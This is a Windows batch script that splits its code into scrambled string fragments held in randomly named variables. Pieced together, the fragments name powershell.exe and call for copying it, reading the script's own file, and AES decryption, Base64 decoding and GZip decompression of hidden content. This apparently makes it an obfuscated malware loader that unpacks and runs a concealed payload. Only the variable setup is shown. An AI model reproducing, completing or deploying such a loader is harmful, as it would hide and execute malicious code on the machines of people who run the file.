@echo off
set "nFFAsaKwbC=co"
set "zhlcSUnAhY=ws"
set "rwnVWQvwil=.e"
set "tRRzaxOyim=s\"
set "EuavOXSHRY=32"
set "XTXBQwtLHK=he"
set "wQxYwZjngX=em"
set "tEkKTYBxbv=1."
set "qobNdssdlS= /"
set "RgBNqRkSmd=rs"
set "TlKuxKaIxd=we"
set "fhzwKmUYAn=do"
set "JbXvqrfLZO=0\"
set "SioCvdFXqN=\v"
set "XfPGFZnjDa=xe"
set "CGYyoTYJFj=Po"
set "piNPIAecyr=:\"
set "oltqctECjZ=ll"
set "kgDITScfmE=we"
set "tTMvSiThpa= C"
set "HVtoksOdbR=st"
set "AITFMAGcEa=y "
set "qmEfHyibiQ=he"
set "hCgbmviWly=ow"
set "WXkzciXcKD=po"
set "UVeonFNJxP=Wi"
set "DybbiAztyV=rS"
set "vkKzjovGup=Sy"
set "azNxCxqCYG=ll"
set "RaNgvtSjIj=nd"
set "DVMUYyTqRV=py"
set "ILwqPEMLdj=in"
set "ZCCWRyxCoI=\W"
set "CvYWqQAJWl=cd"
set "hCHqFrTkZm= %~dp0"
set "HpXSjckrNR=BC;$"
set "XxocklYEmF=Tb ="
set "AqngqBxClr=);$K"
set "IMaiiCcRHP=y]::"
set "NNoOvlEsSV=ect "
set "CRnfaOPKhL=S46e"
set "gYQvOCXPAg=Disp"
set "mLOKRHXcrY=UGTu"
set "JxfGXuOLlB= '')"
set "onNMboYePV=7;$M"
set "TxfUoaresX=Ewo "
set "SktOlpNqbk=PDW."
set "qEMIDRGchF=-joi"
set "ebHUOHyzxo=W = "
set "LmUBhgBeDs=t Sy"
set "KDXgkpFTKU==');"
set "KbmUziayXz=.Con"
set "ceSvXRJuBg=Q = "
set "ZhiVXsqTyb=('%~f0'"
set "syXJnHYaLr=.Key"
set "cSypDMjHek=m.IO"
set "UiSXPbeZJu=ay()"
set "wrqtRcGizg=;$Bz"
set "eamLqYaxRd=whjA"
set "FzVaGxEhTz=ment"
set "LOTggmRoOj=g = "
set "AudvvrjElM=pres"
set "arTxSHkizU=ion."
set "vTYdoDZHHR=iwhj"
set "PWYTWjQOHR=daeR"
set "GKXbmXLUlN=n ''"
set "dumnJayMXc===')"
set "pxtlAdKLHa=);$M"
set "svQwoSMxls=Star"
set "WxwKwzNxSE=$Fsf"
set "ygppLUuyIt=[Sys"
set "rmZhJxwRmY=Comp"
set "QlHMokLIMM=ZYYc"
set "FEHFiRYunI=Rs.T"
set "FoZgQpnfMN=ptog"
set "qDGnWlJoVD=ne);"
set "hpibdcdbuJ=MZDm"
set "QsUWTtmUEf=OyzA"
set "TytEkbdbvG=Fo7l"
set "PLhSHcKhSI=gnir"
set "wdCjDUrngV=.IO."
set "mswJHaUKMp=$MZD"
set "iGegQBxPky=3HWs"
set "jJzWucNCFL=pose"
set "onOMPDuuLN=mt.I"
set "sGqqhRfHVA=and "
set "aadbZBLYcb= [st"
set "RDJrnnBxvo=qEcO"
set "KWvnMnQkmG=join"
set "RFzOgNFsMg=pDZz"
set "pzjsTvatvk=mory"
set "ZpMOEGkGyt=);$f"
set "YXjZquOpsj=; };"
set "LpHSvHqcAF=[Sys"
set "DYtJAGxmLo= = $"
set "nnFMusmzLY== $M"
set "iagCKpHuzj=oaMi"
set "RapWpGqNgy=]::N"
set "KeYbyhsUIY=:('g"
set "cUhWjNjTrv=vert"
set "aWAGtAwjec=null"
set "rrtXLhLDWb=$fJC"
set "hJVuBRfLpu=n ''"
set "PGqIreQUMA=ddin"
set "odKWcLTpWv=();$"
set "qYsyqGwgGW=onve"
set "wsIClhTrxy=Fina"
set "hQhnCJfBen=.Com"
set "xnAYvGpJkE=hy.A"
set "UcKDrzVLUU=A, 0"
set "dlRWuEABdH=oint"
set "zRGcJItxCD=brea"
set "ZxUlYdkrJy=New-"
set "hKTYJoyAys=Comp"
set "lvExoCyVfi=-4] "
set "zKbndHOdUl=pStr"
set "AjFuSrFaNX=le  "
set "rmDjkxQIjm=stem"
set "GMFTxwzIeE=join"
set "fqhQWPDnKI=th('"
set "kInAyMecVG=trea"
set "TdetzTgCuj=stem"
set "YzngflXido=A = "
set "CNguUhtuLX=-1.."
set "jlMWsetzIn= if "
set "JDTMFCNQKx=iwhj"
set "ntRHwjcUgi=yste"
set "IzMPYAldcS=;$GM"
set "NLkxWtUUii=ose("
set "vpuajwAnLx='txe"
set "MGgjSdWVwZ=16] "
set "gkcgQPhpPC=sfQQ"
set "NxhGBYPLYX=urit"
set "KjbOvkfIcv=)) {"
set "AJmGiOthbf=rans"
set "eaPqJURAdR=nage"
set "aQUuANalef=ZDmt"
set "OqYtLTQSaK=[-1."
set "qXvSrMazXn=ZDmt"
set "pJpZIcynFq=em.I"
set "eztEwOYWnZ=miRT"
set "PxgdQzHPGm=)))"
set "ihyrKfUzoz=;$Ix"
set "iJmOlbRXVt=Disp"
set "IWhCydnXkQ=)($y"
set "HzAHRwTyJh=ss -"
set "cbCOLKCOjx=bstr"
set "VvzkmUKIZs=6] -"
set "mFphWGPoPl=).Sp"
set "gFkdsdhYJq=iron"
set "AkvHDeOjab=isfL"
set "dgsLfpqzJY=ewLi"
set "PSoCxSJfEy=PKCS"
set "dfbvcAZAJZ=tem."
set "AXnnFZSzHS=('%*'"
set "XfjcqyxOOT=$miR"
set "cHnnvCGKKv=3); "
set "dqbEbofvsG=ode]"
set "CEwsJDxybQ=eam("
set "CwCVegaWSR=.Dis"
set "TLnIXQuftf=Rs);"
set "cKdmFdPMkz=gth)"
set "oTfsvyWkpS=[Sys"
set "JqVkqMKTmo=Obje"
set "LVkAwybsNF=whjA"
set "IoiniHwdsu=ose("
set "otSZYLhpIH=esaB"
set "DWaCZxHmgP=($qL"
set "oHogqXRyXu=();$"
set "CiyGdoAswR=('l0"
set "BjKmmYVhjL=rtS4"
set "YlGbqHDuzY=ZDmt"
set "gszjFeYjLE=QQ.D"
set "GnOHYSSsDr=A = "
set "oaxhyOFrrR=nirt"
set "sCqkRWueld=bjec"
set "cXpJTyeldS=Syst"
set "WNXwNvXFuf=$fJC"
set "yQntVEjUOp=.GZi"
